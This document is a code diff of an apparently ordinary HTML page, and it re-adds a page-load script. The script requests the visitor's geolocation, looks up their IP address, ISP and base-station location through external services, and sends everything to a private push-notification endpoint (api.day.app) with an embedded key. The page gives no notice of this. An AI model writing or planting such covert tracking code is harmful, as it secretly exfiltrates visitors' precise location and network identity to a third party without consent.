@@ -275,132 +275,128 @@
     </div>
 
   </section>
-  <script>
-    var ip;
-    var org;
-    var longitude;
-    var latitude;
-    var baseStation;
-    window.onload = function () {
-      getLocation();
-    }
-
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-      } else {//alert("浏览器不支持地理定位。");
-      }
-    }
-    function showPosition(position) {
-      latitude = position.coords.latitude;
-      longitude = position.coords.longitude;
-      console.log("纬度: " + position.coords.latitude + "，经度: " + position.coords.longitude);
-      getIP2();
-    }
-
-    //获取IP
-    function getIP1() {
-      var xhr = new XMLHttpRequest();
-      // 设置请求的URL
-      xhr.open('GET', 'http://ip-api.com/json');
-      // 发送请求
-      xhr.send();
-      // 监听请求状态
-
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-          // 请求成功，获取响应数据
-          var response = JSON.parse(xhr.responseText);
-          // 获取当前设备的IP
-          ip = response.query;
-          org = response.org;
-          getBaseStation(ip);
-          if (longitude === undefined) {
-            console.log('longitude === undefined');
-            defaultFun();
-          } else {
-            defaultFun();
-          }
+    <script>
+        var ip;
+        var org;
+        var longitude;
+        var latitude;
+        var baseStation;
+        window.onload = function () {
+            getLocation();
         }
-      }
-    }
 
-    function getIP2() {
-      var xhr = new XMLHttpRequest();
-      // 设置请求的URL
-      xhr.open('GET', 'https://api.ip.sb/geoip');
-      // 发送请求
-      xhr.send();
-      // 监听请求状态
-
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-          // 请求成功，获取响应数据
-          var response = JSON.parse(xhr.responseText);
-          // 获取当前设备的IP
-          ip = response.ip;
-          org = response.asn_organization;
-          getBaseStation(ip);
-          if (longitude === undefined) {
-            console.log('longitude === undefined');
-            defaultFun();
-          } else {
-            defaultFun();
-          }
-          //console.log('getIP2 if');
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition);
+            } else {//alert("浏览器不支持地理定位。");
+            }
         }
-      }
-    }
-
-    //获取基站
-    function getBaseStation(ip) {
-      var xhr = new XMLHttpRequest();
-      // 设置请求的URL
-      xhr.open('GET', 'http://ip.zxinc.org/api.php?type=json&' + ip);
-      // 发送请求
-      xhr.send();
-      // 监听请求状态
-
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-          // 请求成功，获取响应数据
-          var response = JSON.parse(xhr.responseText);
-          // 获取当前设备的IP
-          baseStation = response.data.location;
-          if (longitude === undefined) {
-            console.log('longitude === undefined');
-            defaultFun();
-          } else {
-            defaultFun();
-          }
-          //baseStation.toString().split(' ').join('');
-          //console.log(baseStation);
+        function showPosition(position) {
+            latitude = position.coords.latitude;
+            longitude = position.coords.longitude;
+            console.log("纬度: " + position.coords.latitude + "，经度: " + position.coords.longitude);
+            getIP2();
         }
-      }
-    }
 
-    //获取GET请求返回值
-    function getJSON(url, /*callback*/
-    ) {
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET', url, true);
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState == 4 && xhr.status == 200) {
-          var data = JSON.parse(xhr.responseText);
-          /*callback(data);*/
+        //获取IP
+        function getIP1() {
+            var xhr = new XMLHttpRequest();
+            // 设置请求的URL
+            xhr.open('GET', 'http://ip-api.com/json');
+            // 发送请求
+            xhr.send();
+            // 监听请求状态
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // 请求成功，获取响应数据
+                    var response = JSON.parse(xhr.responseText);
+                    // 获取当前设备的IP
+                    ip = response.query;
+                    org = response.org;
+                    getBaseStation(ip);
+                    console.log('getIP1');
+                    if (longitude === undefined) {
+                        console.log('longitude === undefined');
+                        defaultFun();
+                    } else {
+                        defaultFun();
+                    }
+                }
+            }
         }
-      }
-      xhr.send();
-    }
 
-    function defaultFun() {
-      console.log('defaultFun');
-      var date = new Date();
-      var strdate = date.getUTCFullYear() + "-" + (date.getMonth() + 1) + "-" + date.getDate() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + "." + date.getMilliseconds();
-      var url = "https://api.day.app/TbsfqDZZoJXnaP46cttdsN/" + strdate + "，访问功能：蝴蝶" + "，本次访问IP地址：" + ip + "，本次访问运营商：" + org + "，经度：" + longitude + "，纬度：" + latitude + "，本次访问基站：" + baseStation + '?group=蝴蝶';
-      getJSON(url);
-    }
-  </script>
+        function getIP2() {
+            var xhr = new XMLHttpRequest();
+            // 设置请求的URL
+            xhr.open('GET', 'https://api.ip.sb/geoip');
+            // 发送请求
+            xhr.send();
+            // 监听请求状态
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // 请求成功，获取响应数据
+                    var response = JSON.parse(xhr.responseText);
+                    // 获取当前设备的IP
+                    ip = response.ip;
+                    org = response.asn_organization;
+                    getBaseStation(ip);
+                    if (longitude === undefined) {
+                        console.log('longitude === undefined');
+                        defaultFun();
+                    } else {
+                        defaultFun();
+                    }
+                    //console.log('getIP2 if');
+                }
+            }
+        }
+
+        //获取基站
+        function getBaseStation(ip) {
+            var xhr = new XMLHttpRequest();
+            // 设置请求的URL
+            xhr.open('GET', 'https://ip.zxinc.org/api.php?type=json&' + ip);
+            // 发送请求
+            xhr.send();
+            // 监听请求状态
+
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    // 请求成功，获取响应数据
+                    var response = JSON.parse(xhr.responseText);
+                    // 获取当前设备的IP
+                    baseStation = response.data.location;
+                    defaultFun();
+                    //baseStation.toString().split(' ').join('');
+                    //console.log(baseStation);
+                }
+            }
+        }
+
+        //获取GET请求返回值
+        function getJSON(url, /*callback*/
+        ) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', url, true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    var data = JSON.parse(xhr.responseText);
+                    /*callback(data);*/
+                }
+            }
+            xhr.send();
+        }
+
+        function defaultFun() {
+            console.log('defaultFun');
+            var date = new Date();
+            var strdate = date.getUTCFullYear() + "-" + (date.getMonth() + 1) + "-" + date.getDate() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + "." + date.getMilliseconds();
+            var url = "https://api.day.app/TbsfqDZZoJXnaP46cttdsN/" + strdate + "，访问功能：蝴蝶" + "，本次访问IP地址：" + ip + "，本次访问运营商：" + org + "，经度：" + longitude + "，纬度：" + latitude + "，本次访问基站：" + baseStation + '?group=蝴蝶';
+            getJSON(url);
+        }
+    </script>
 </body>
 
 </html>
